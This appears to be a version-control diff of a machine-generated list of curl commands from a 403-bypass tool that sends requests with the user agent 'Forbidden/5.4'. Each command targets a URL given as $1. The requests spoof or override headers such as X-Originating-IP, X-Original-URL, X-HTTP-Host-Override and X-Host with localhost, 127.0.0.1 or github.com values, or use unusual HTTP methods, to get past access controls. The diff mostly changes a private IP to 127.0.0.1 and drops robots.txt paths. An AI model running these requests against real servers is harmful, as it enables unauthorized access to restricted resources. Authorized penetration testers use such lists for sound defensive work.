-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -634,22 +634,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -660,7 +660,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -674,8 +674,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -697,10 +697,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Original-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Method-Override: VERSION-CONTROL' -H 'User-Agent: Forbidden/5.4' -X 'VERSION-CONTROL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Method-Override: VERSION-CONTROL' -H 'User-Agent: Forbidden/5.4' -X 'UPDATEREDIRECTREF' $1
@@ -6379,16 +6379,16 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Method: ACL' -
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Method: ACL' -H 'User-Agent: Forbidden/5.4' -X 'ARBITRARY' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Method: ACL' -H 'User-Agent: Forbidden/5.4' -X 'ACL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6399,7 +6399,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6413,8 +6413,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6436,22 +6436,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-HTTP-Host-Override: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6462,7 +6462,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6476,8 +6476,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -6499,22 +6499,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1 @ht
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Forwared-Host: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
